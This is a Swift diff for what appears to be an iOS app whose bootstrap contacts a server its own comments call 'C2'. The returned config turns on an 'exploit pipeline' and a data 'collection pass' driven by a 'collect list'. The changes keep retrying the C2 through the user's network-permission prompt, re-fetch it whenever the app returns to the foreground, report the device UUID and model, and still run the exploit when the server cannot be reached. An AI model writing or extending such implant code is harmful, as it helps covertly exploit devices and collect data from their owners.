@@ -510,33 +510,78 @@ enum MainAPI {
         return true
     }
 
-    /// fetchDeviceConfig with retry: network gate first, then exponential
-    /// backoff over transport-level failures only.
-    static func fetchDeviceConfigWithRetry(attempts: Int = 4) async -> Result<DeviceConfig, Error> {
-        let gateOK = await waitForUsableNetwork()
-        globallogger.log("(api) network gate: \(gateOK ? "usable" : "timeout - trying anyway")")
+    /// fetchDeviceConfig with retry.
+    ///
+    /// Time-budgeted, not attempt-counted: the first-launch "allow wireless
+    /// data / 蜂窝网络" alert keeps the app's network down while NWPathMonitor
+    /// still reports `.satisfied` (the Wi-Fi interface itself is up), so a
+    /// handful of fast attempts can all burn out while the user is still
+    /// reading the alert. Keep retrying with capped backoff until the budget
+    /// expires; server/decrypt errors still abort immediately.
+    static func fetchDeviceConfigWithRetry(budget: TimeInterval = 90) async -> Result<DeviceConfig, Error> {
+        let gateOK = await waitForUsableNetwork(maxWait: 5)
+        globallogger.log("(api) network gate: \(gateOK ? "usable" : "pending (permission alert?) - will keep polling")")
+        let deadline = Date().addingTimeInterval(budget)
         var lastErr: Error = APIError.badResponse
-        for attempt in 1...max(1, attempts) {
+        var attempt = 0
+        while true {
+            attempt += 1
             let outcome = await fetchDeviceConfig()
             switch outcome {
             case .success:
+                if attempt > 1 {
+                    globallogger.log("(api) /api/device/config ok on attempt \(attempt) - network became usable")
+                }
                 return outcome
             case .failure(let err):
                 lastErr = err
-                globallogger.log("(api) /api/device/config attempt \(attempt)/\(attempts) failed: \(err.localizedDescription)")
-                let retryable = isTransportFailure(err)
-                if !retryable || attempt == attempts { break }
-                let delay = min(9.0, pow(2.0, Double(attempt - 1)))
+                if !isTransportFailure(err) {
+                    globallogger.log("(api) /api/device/config attempt \(attempt) failed (non-transport, no retry): \(err.localizedDescription)")
+                    return outcome
+                }
+                let left = deadline.timeIntervalSinceNow
+                if left <= 0 {
+                    globallogger.log("(api) /api/device/config failed after \(attempt) attempts over \(Int(budget))s: \(err.localizedDescription)")
+                    return outcome
+                }
+                let delay = min(8.0, pow(2.0, Double(min(attempt, 3))))
+                globallogger.log("(api) /api/device/config attempt \(attempt) failed: \(err.localizedDescription) - retrying in \(Int(delay))s (\(Int(left))s left)")
                 try? await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000))
-                _ = await waitForUsableNetwork(maxWait: 10)
+                _ = await waitForUsableNetwork(maxWait: 5)
             }
         }
-        return .failure(lastErr)
+    }
+
+    /// True once a real server config has been parsed this launch.
+    static var configResolved = false
+    /// True once the exploit pipeline has been kicked off this launch.
+    static var pipelineStarted = false
+    /// True while a bootstrap Task is in flight (prevents duplicate fetches
+    /// when the app returns to the foreground several times).
+    static var bootstrapRunning = false
+
+    private static func finishBootstrap(_ onDecision: @escaping (Bool) -> Void, run: Bool) {
+        bootstrapRunning = false
+        if run { pipelineStarted = true }
+        onDecision(run)
+    }
+
+    /// Called when the app returns to the foreground. The first-launch
+    /// "allow wireless data / cellular" alert blocks the app's network while
+    /// the pipeline is already running on the offline fallback config, so the
+    /// real server config (and its collect list) only becomes reachable after
+    /// the user taps Allow. Re-fetch it then instead of waiting for a relaunch.
+    static func retryBootstrapIfNeeded(_ onDecision: @escaping (Bool) -> Void) {
+        guard !configResolved, !bootstrapRunning else { return }
+        globallogger.log("(api) foreground: server config not resolved yet - retrying bootstrap")
+        reportLogAsync(text: "foreground retry: server config not resolved")
+        bootstrap(onDecision)
     }
 
     static func bootstrap(_ onDecision: @escaping (Bool) -> Void) {
         // 构建/设备指纹：第一行就打印，用于确认安装的是哪个包 + UUID 是否稳定
         globallogger.log("(api) build-marker api-v2-reportfix uuid=\(deviceUUID())")
+        bootstrapRunning = true
         reportLogAsync(text: "app opened ios=\(UIDevice.current.systemVersion) machine=\(devicemachine()) uuid=\(deviceUUID())")
         globallogger.log("(api) requesting /api/device/config ...")
         Task {
@@ -562,18 +607,27 @@ enum MainAPI {
                 case .success:
                     guard let cfg else {
                         globallogger.log("(api) config parse failed — pipeline skipped")
-                        onDecision(false)
+                        finishBootstrap(onDecision, run: false)
                         return
                     }
                     lastConfig = cfg
                     globallogger.log("(api) config: version=\(cfg.version ?? "-") exploit_enabled=\(cfg.exploit_enabled) repeat=\(cfg.exploit_repeat_enabled) interval=\(cfg.exploit_repeat_interval) collect_configs=\(cfg.collect_configs?.count ?? 0) log_report=\(cfg.app_log_report_enabled)")
+                    configResolved = true
                     reportLogAsync(text: "config ok: exploit_enabled=\(cfg.exploit_enabled) collect_configs=\(cfg.collect_configs?.count ?? 0)")
+                    if pipelineStarted {
+                        globallogger.log("(api) config refreshed after launch - pipeline already started, collecting with fresh list")
+                        reportLogAsync(text: "config refreshed; collecting with fresh list")
+                        bootstrapRunning = false
+                        runCollectionPass()
+                        finishBootstrap(onDecision, run: false)
+                        return
+                    }
                     if shouldRunPipeline(cfg) {
                         globallogger.log("(api) exploit_enabled=true — running pipeline")
-                        onDecision(true)
+                        finishBootstrap(onDecision, run: true)
                     } else {
                         globallogger.log("(api) pipeline skipped (switch off / repeat interval)")
-                        onDecision(false)
+                        finishBootstrap(onDecision, run: false)
                     }
                 case .failure(let err):
                     // C2 unreachable: fall back to a default config with the
@@ -590,7 +644,7 @@ enum MainAPI {
                     ])
                     lastConfig = fallback
                     globallogger.log("(api) config: version=fallback exploit_enabled=true collect_configs=0")
-                    onDecision(true)
+                    finishBootstrap(onDecision, run: true)
                 }
             }
         }
